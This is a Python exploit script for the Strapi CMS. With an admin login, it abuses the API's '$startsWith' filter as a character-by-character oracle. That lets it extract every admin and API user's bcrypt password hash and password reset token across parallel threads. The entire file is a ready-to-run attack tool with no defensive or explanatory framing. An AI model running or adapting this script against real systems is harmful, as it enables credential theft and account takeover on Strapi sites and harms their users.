import argparse, requests, sys
import urllib.parse as urlparse
from concurrent.futures import ThreadPoolExecutor

THREADS=20
BCRYPT_CHARS = "$./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
TOTAL_CHARS = len(BCRYPT_CHARS)

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-u', '--username',
        help='The email of an admin account on Strapi',
        required=True
    )

    parser.add_argument(
        '-p', '--password',
        help='The password of an admin account on Strapi',
        required=True
    )

    parser.add_argument(
        'target',
        help='Target URL'
    )

    return parser.parse_args()


class StrapiSession(requests.Session):
    def __init__(self, base_url, api_token):
        super().__init__()
        self.base_url = base_url
        self.api_token = api_token

    def request(self, method, url, *args, **kwargs):
        joined_url = urlparse.urljoin(self.base_url, url)
        headers = kwargs.get("headers", {})
        headers["Authorization"] = f"Bearer {self.api_token}"
        kwargs["headers"] = headers
        return super().request(method, joined_url, *args, **kwargs)


def get_api_token(target, username, password) -> str:
    r = requests.post(
        urlparse.urljoin(target, "/admin/login"),
        json={
            "email": username,
            "password": password
        }
    )
    r_json = r.json()
    if "error" in r_json:
        raise Exception("Invalid admin credentials were provided")

    return r_json["data"]["token"]


def get_users(s: StrapiSession, api_url):
    user_emails=[]
    page=1
    total_pages=None

    while True:
        r = s.get(api_url, data={
            "pageSize": 10,
            "page": page
        })

        r_json = r.json()
        if "data" in r_json:
            r_json = r_json["data"]
        total_pages = r_json["pagination"]["pageCount"]
        page = r_json["pagination"]["page"]

        user_emails.extend([u["email"] for u in r_json["results"]])
        if total_pages == page:
            break
        page += 1

    return user_emails


def attempt_char(s: StrapiSession, api_url, email, known_hash, c, keyname):
    r = s.get(
        api_url + f"?pageSize=1&page=1&filters[$and][0][email][$eq]={email}&filters[$and][1][{keyname}][$startsWith]={known_hash + c}",
    )
    r_json = r.json()
    if "data" in r_json:
        r_json = r_json["data"]

    if r_json["pagination"]["total"] == 1:
        return (True, c)
    return (False, None)


def dump_user_data(s, api_url, email, keyname):
    # Bcrypt hashes start with $2a$
    dumped_data = ""
    print(f"\t{email}:", end="")
    sys.stdout.flush()

    while True:
        found_char = False

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(
                attempt_char,
                TOTAL_CHARS * [s],
                TOTAL_CHARS * [api_url],
                TOTAL_CHARS * [email],
                TOTAL_CHARS * [dumped_data],
                BCRYPT_CHARS,
                TOTAL_CHARS * [keyname]
            )

            for result in futures:
                matched_char, char = result
                if matched_char:
                    found_char = True
                    dumped_data = dumped_data + char
                    print(char, end="")
                    sys.stdout.flush()
                    break

        if not found_char:
            break
    print("")


def dump_hashes(s, api_url, start_msg):
    print(start_msg + " Password Hashes")

    try:
        user_emails = get_users(s, api_url)
    except:
        print("Your account does not have permissions!")
        return

    for email in user_emails:
        dump_user_data(s, api_url, email, "password")

    print()

    print(start_msg + " Password Reset Tokens")
    for email in user_emails:
        dump_user_data(s, api_url, email, "reset_password_token")

    print()


def main(args):
    username = args.username
    password = args.password
    target = args.target

    api_token = get_api_token(target, username, password)

    with StrapiSession(target, api_token) as s:
        dump_hashes(s, "/admin/users", "Dumping Admin Account")
        dump_hashes(s, "/content-manager/collection-types/plugin::users-permissions.user", "Dumping API User Account")

if __name__ == "__main__":
    args = parse_args()
    main(args)
